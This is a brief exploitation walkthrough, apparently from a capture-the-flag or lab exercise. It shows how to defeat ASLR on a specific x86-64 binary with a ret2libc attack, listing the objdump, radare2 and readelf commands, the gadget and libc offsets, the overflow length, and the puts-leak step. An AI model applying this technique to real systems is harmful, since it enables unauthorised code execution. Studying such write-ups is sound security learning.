Bypassing ASLR and performing ret2libc attack.

After decompiling with ghidra, we can see three standard functions : puts, gets, fflush. We will attack puts.

1)Get function addresses in binary:
	# objdump -D executable | grep puts
	We get plt (0x4004e0) and got (0x601018) addresses.
2)Get the pop rdi and return address:
	# r2 executable 
	# [0x00400530]> /R pop rdi
	Pop rdi address is (0x004006d3)
3)Get address of main()
	# objdump -D executable | grep main
	Address is (0x400626)
4)Now find offset of puts, system, /bin/bash in libc
	#readelf -s /lib/x86_64-linux-gnu/libc-2.27.so | grep puts
	#readelf -s /lib/x86_64-linux-gnu/libc-2.27.so | grep system
	#strings -a -t x /lib/x86_64-linux-gnu/libc-2.27.so | grep /bin/sh 
	We got : 0x809c0, 0x4f440 and 0x1b3e9a
5) Overflow occurs when more than 71 bytes sent.
6) We send junk, pop rdi addr, then got addr of puts() and print the puts() address in libc by calling(jumping to) plt puts() and returning to main.
7) Leaked puts:0x7f9518d089c0
8) Use this address to calculate offsets, and calculate addresses of system(0 and /bin/sh in libc.
